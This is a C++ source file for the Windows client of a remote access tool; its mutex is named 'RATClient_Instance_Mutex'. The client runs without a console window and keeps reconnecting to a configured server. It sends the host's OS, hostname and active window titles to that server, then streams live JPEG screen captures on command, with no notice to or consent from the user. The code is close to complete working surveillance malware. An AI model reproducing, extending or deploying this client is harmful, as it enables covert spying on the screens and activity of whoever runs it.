#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <objbase.h>
#include <cstring>
#include "config.h"
#include "network.h"
#include "protocol.h"
#include "screen.h"
#include "sysinfo.h"
#include "watcher.h"

// Static buffers — zero heap allocation after startup
static unsigned char s_pktBuf  [2048];
static unsigned char s_frameBuf[1024 * 1024]; // 1 MB JPEG output buffer
static char          s_os      [128];
static char          s_hostname[ 64];

// Screen streaming state (reset each session)
static bool  s_streaming  = false;
static int   s_quality    = 50;
static int   s_fps        = 10;
static DWORD s_lastFrame  = 0;

// ── helpers ────────────────────────────────────────────────────────────────

static bool DrainBytes(SOCKET sock, unsigned int count)
{
    unsigned char tmp[256];
    while (count > 0)
    {
        int chunk = count < sizeof(tmp) ? static_cast<int>(count) : static_cast<int>(sizeof(tmp));
        if (!Net_RecvAll(sock, tmp, chunk)) return false;
        count -= static_cast<unsigned int>(chunk);
    }
    return true;
}

// ── session ────────────────────────────────────────────────────────────────

static bool RunSession(SOCKET sock)
{
    s_streaming = false;

    GetOsString      (s_os,       sizeof(s_os));
    GetHostnameString(s_hostname, sizeof(s_hostname));

    char activeWnd[1024] = {};
    char curWnd   [1024];
    GetActiveWindowTitle(activeWnd, sizeof(activeWnd));

    // HELLO
    int len = Pkt_BuildHello(s_pktBuf, sizeof(s_pktBuf),
                             s_os, s_hostname, activeWnd);
    if (len < 0 || !Net_SendAll(sock, s_pktBuf, len)) return false;

    DWORD lastActivity = GetTickCount();

    while (true)
    {
        // Compute select timeout: wake up in time for next frame (or UPDATE_INTERVAL_MS)
        DWORD tvMs = UPDATE_INTERVAL_MS;
        if (s_streaming)
        {
            DWORD interval = 1000u / static_cast<DWORD>(s_fps);
            DWORD elapsed  = GetTickCount() - s_lastFrame;
            DWORD remain   = elapsed >= interval ? 1u : interval - elapsed;
            if (remain < tvMs) tvMs = remain;
        }

        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeval tv;
        tv.tv_sec  = 0;
        tv.tv_usec = static_cast<long>(tvMs) * 1000;

        int sel = select(0, &fds, nullptr, nullptr, &tv);
        if (sel == SOCKET_ERROR) return false;

        // ── incoming packet ───────────────────────────────────────────────
        if (sel > 0 && FD_ISSET(sock, &fds))
        {
            unsigned char header[5];
            if (!Net_RecvAll(sock, header, 5)) return false;

            unsigned int payLen =
                (static_cast<unsigned int>(header[0])      ) |
                (static_cast<unsigned int>(header[1]) <<  8) |
                (static_cast<unsigned int>(header[2]) << 16) |
                (static_cast<unsigned int>(header[3]) << 24);
            unsigned char type = header[4];

            lastActivity = GetTickCount();

            if (type == PKT_PING)
            {
                if (!DrainBytes(sock, payLen)) return false;
                int plen = Pkt_BuildPong(s_pktBuf, sizeof(s_pktBuf));
                if (plen < 0 || !Net_SendAll(sock, s_pktBuf, plen)) return false;
            }
            else if (type == PKT_SCREEN_START)
            {
                unsigned char params[2] = {50, 10};
                if (payLen >= 2)
                {
                    if (!Net_RecvAll(sock, params, 2)) return false;
                    if (!DrainBytes(sock, payLen - 2)) return false;
                }
                else
                {
                    if (!DrainBytes(sock, payLen)) return false;
                }
                int q = params[0];
                int f = params[1];
                s_quality    = q < 1 ? 1 : (q > 95 ? 95 : q);
                s_fps        = f < 1 ? 1 : (f > 30 ? 30 : f);
                s_streaming  = true;
                // Trigger first frame immediately
                s_lastFrame  = GetTickCount() - (1000u / static_cast<DWORD>(s_fps));
            }
            else if (type == PKT_SCREEN_STOP)
            {
                if (!DrainBytes(sock, payLen)) return false;
                s_streaming = false;
            }
            else
            {
                // Unknown type — drain up to 64 KB, bail on absurd sizes
                if (payLen > 65536) return false;
                if (!DrainBytes(sock, payLen)) return false;
            }
        }

        // ── ping timeout ──────────────────────────────────────────────────
        if (GetTickCount() - lastActivity > PING_TIMEOUT_MS) return false;

        // ── active window delta ───────────────────────────────────────────
        GetActiveWindowTitle(curWnd, sizeof(curWnd));
        if (strcmp(curWnd, activeWnd) != 0)
        {
            memcpy(activeWnd, curWnd, sizeof(activeWnd));
            int ulen = Pkt_BuildUpdate(s_pktBuf, sizeof(s_pktBuf), activeWnd);
            if (ulen < 0 || !Net_SendAll(sock, s_pktBuf, ulen)) return false;
        }

        // ── screen frame ──────────────────────────────────────────────────
        if (s_streaming)
        {
            DWORD interval = 1000u / static_cast<DWORD>(s_fps);
            if (GetTickCount() - s_lastFrame >= interval)
            {
                int jpegLen = Screen_Capture(s_frameBuf, sizeof(s_frameBuf), s_quality);
                if (jpegLen > 0)
                {
                    int hlen = Pkt_BuildScreenFrameHeader(s_pktBuf, sizeof(s_pktBuf), jpegLen);
                    if (hlen < 0) return false;
                    if (!Net_SendAll(sock, s_pktBuf, 5))              return false;
                    if (!Net_SendAll(sock, s_frameBuf, jpegLen))       return false;
                }
                s_lastFrame = GetTickCount();
            }
        }
    }
}

// ── entry point ───────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    HANDLE mutex = CreateMutexW(nullptr, TRUE, L"RATClient_Instance_Mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        if (mutex) CloseHandle(mutex);
        return 0;
    }

    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    Screen_Init();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    int delay = RECONNECT_MIN_SEC;

    while (true)
    {
        SOCKET sock = Net_Connect(SERVER_ADDR, SERVER_PORT);
        if (sock != INVALID_SOCKET)
        {
            RunSession(sock);
            Net_Disconnect(sock);
            delay = RECONNECT_MIN_SEC;
        }
        else
        {
            Sleep(delay * 1000);
            if (delay < RECONNECT_MAX_SEC)
                delay = (delay * 2 < RECONNECT_MAX_SEC) ? delay * 2 : RECONNECT_MAX_SEC;
        }
    }

    Screen_Cleanup();
    CoUninitialize();
    WSACleanup();
    CloseHandle(mutex);
    return 0;
}
